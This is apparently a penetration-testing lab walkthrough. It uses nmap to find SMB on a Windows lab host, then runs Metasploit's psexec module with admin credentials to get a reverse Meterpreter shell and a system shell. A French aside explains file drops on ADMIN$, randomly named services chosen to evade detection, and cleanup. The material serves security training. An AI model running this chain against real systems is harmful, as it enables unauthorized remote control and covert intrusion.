# Automating Payloads & Delivery with Metasploit

***

### <mark style="color:red;">Practicing with Metasploit</mark>

Let's start working hands-on with Metasploit by launching the Metasploit framework console as root (`sudo msfconsole`)

<mark style="color:orange;">**Starting MSF**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ sudo msfconsole 
```

We can see there is creative ASCII art presented as the banner at launch and some numbers of particular interest.

* `2131` exploits
* `592` payloads

In this case, we will be using enumeration results from a `nmap` scan to pick a Metasploit module to use.

<mark style="color:green;">**NMAP Scan**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```
{% endcode %}

In the output, we see several standard ports that are typically open on a Windows system by default. Remember that scanning and enumeration is an excellent way to know what OS (Windows or Linux) our target is running to find an appropriate module to run with Metasploit. Let's go with `SMB` (listening on `445`) as the potential attack vector.

Once we have this information, we can use Metasploit's search functionality to discover modules that are associated with SMB. In the `msfconsole`, we can issue the command `search smb` to get a list of modules associated with SMB vulnerabilities:

<mark style="color:green;">**Searching Within Metasploit**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > search smb
```
{% endcode %}

We will see a long list of `Matching Modules` associated with our search. Notice the format each module is in. Each module has a number listed on the far left of the table to make selecting the module easier, a `Name`, `Disclosure Date`, `Rank`, `Check` and `Description`.

The number to the \`left\` of each potential module is a relative number based on your search that may change as modules are added to Metasploit. Don't expect this number to match every time you perform the search or attempt to use the module.

Let's look at one module, in particular, to understand it within the context of payloads.

`56 exploit/windows/smb/psexec`

<table data-full-width="true"><thead><tr><th>Output</th><th>Meaning</th></tr></thead><tbody><tr><td><code>56</code></td><td>The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command <code>use 56</code> to select the module.</td></tr><tr><td><code>exploit/</code></td><td>This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.</td></tr><tr><td><code>windows/</code></td><td>This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.</td></tr><tr><td><code>smb/</code></td><td>This defines the service for which the payload in the module is written.</td></tr><tr><td><code>psexec</code></td><td>This defines the tool that will get uploaded to the target system if it is vulnerable.</td></tr></tbody></table>

Once we select the module, we will notice a change in the prompt that gives us the ability to configure the module based on parameters specific to our environment.

<mark style="color:orange;">**Option Selection**</mark>

```shell-session
msf6 > use 56
```

Notice how `exploit` is outside of the parentheses. This can be interpreted as the MSF module type being an exploit, and the specific exploit & payload is written for Windows. The attack vector is `SMB`, and the Meterpreter payload will be delivered using [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Let's learn more about using this exploit and delivering the payload by using the `options` command.

<mark style="color:orange;">**Examining an Exploit's Options**</mark>

{% code fullWidth="true" %}
```bash
msf6 exploit(windows/smb/psexec) > options
```
{% endcode %}

We will want to use the `set` command to configure the following settings as such:

<mark style="color:orange;">**Setting Options**</mark>

```shell-session

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

<mark style="color:green;">**These settings will ensure that our payload is delivered to the proper target (**</mark><mark style="color:green;">**`RHOSTS`**</mark><mark style="color:green;">**), uploaded to the default administrative share (**</mark><mark style="color:green;">**`ADMIN$`**</mark><mark style="color:green;">**) utilizing credentials (**</mark><mark style="color:green;">**`SMBPass`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**&**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`SMBUser`**</mark><mark style="color:green;">**), then initiate a reverse shell connection with our local host machine (**</mark><mark style="color:green;">**`LHOST`**</mark><mark style="color:green;">**).**</mark>

<mark style="color:orange;">**Exploits Away**</mark>

```shell-session

msf6 exploit(windows/smb/psexec) > exploit

meterpreter > 
```

In this case, as detailed in the [Rapid 7 Module Documentation](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/): "This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. "

{% hint style="warning" %}
#### Introduction à PsExec et au module Metasploit correspondant

Le module **PsExec** de Metasploit est utilisé pour exécuter à distance des commandes ou des payloads (programmes malveillants, shells, etc.) sur une machine **Windows** cible. Ce module fonctionne en exploitant les services **SMB** (Server Message Block) sur Windows, généralement via le port **445**, et il nécessite un accès **administrateur** à la machine cible pour fonctionner.

Le module PsExec permet de :

* **Déposer un fichier** malveillant sur la machine cible via un partage réseau.
* **Créer un service** sur cette machine à partir de ce fichier.
* **Exécuter ce service**, ce qui permet d'exécuter le payload (comme un shell Meterpreter).



**Étapes clés et concepts importants**

Voyons maintenant chaque partie du processus, en expliquant à quoi sert chaque étape :

**1. Utilisation d'un nom d'utilisateur et mot de passe administrateur**

Le module de Metasploit mentionné dans la documentation de **Rapid7** nécessite des **informations d'identification administratives** valides sur la machine cible. Cela signifie que l'attaquant doit avoir :

* Un nom d'utilisateur administrateur.
* Un mot de passe **ou** un **hash** de mot de passe.

Le **hash** est une version cryptée du mot de passe qu'un attaquant peut utiliser directement sans avoir à connaître le mot de passe réel.

**Pourquoi cela est-il important ?** Pour exécuter des commandes à distance sur une machine Windows en utilisant les services **SMB**, il faut des privilèges élevés (privilèges administratifs). Cela garantit que l'attaquant a les droits nécessaires pour déposer des fichiers, créer des services, et exécuter des processus.

**2. Exécution d'un payload arbitraire**

Un **payload arbitraire** signifie que l'attaquant peut exécuter n'importe quel programme de son choix sur la machine cible, qu'il s'agisse d'une simple commande ou d'un programme plus complexe, comme un shell **Meterpreter** (un outil de contrôle à distance utilisé dans Metasploit).

**Comment cela fonctionne :**

* Une fois que l'attaquant a accès avec les droits administratifs, il peut déposer un fichier sur la machine cible via le partage **ADMIN$**, un partage administratif spécial utilisé pour l'administration à distance.
* Ensuite, l'attaquant crée un **service** Windows qui va lancer ce programme.

**3. Création d'un service à distance avec un nom aléatoire**

Dans Windows, les **services** sont des programmes qui fonctionnent en arrière-plan et exécutent diverses tâches sur le système. Metasploit, via PsExec, crée un service pour exécuter le fichier malveillant qu'il vient de déposer. Ce service est enregistré avec :

* Un **nom aléatoire**.
* Une **description aléatoire**.

L'utilisation de noms et de descriptions aléatoires rend plus difficile la détection par les administrateurs, car le service semble légitime, ou du moins anodin.

**Pourquoi créer un service ?** Windows ne permet pas simplement d'exécuter des fichiers à distance sans protection. Créer un service est une manière légitime de lancer un programme sur la machine, et cela permet d'éviter certaines restrictions de sécurité.

**4. Nettoyage automatique (cleanup)**

Le module PsExec de Metasploit peut également nettoyer après son exécution. Cela signifie qu'une fois que le payload a été exécuté (et que l'attaquant a obtenu l'accès à distance qu'il souhaitait), le service qu'il a créé sera supprimé, et les traces sur la machine seront minimisées.
{% endhint %}

{% hint style="danger" %}
**Like other command language interpreters (Bash, PowerShell, ksh, etc...), Meterpreter shell sessions allow us to issue a set of commands we can use to interact with the target system. We can use the `?` to see a list of commands we can use. We will notice limitations with the Meterpreter shell, so it is good to attempt to use the `shell` command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.**
{% endhint %}

<mark style="color:orange;">**Interactive Shell**</mark>

```shell-session
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```
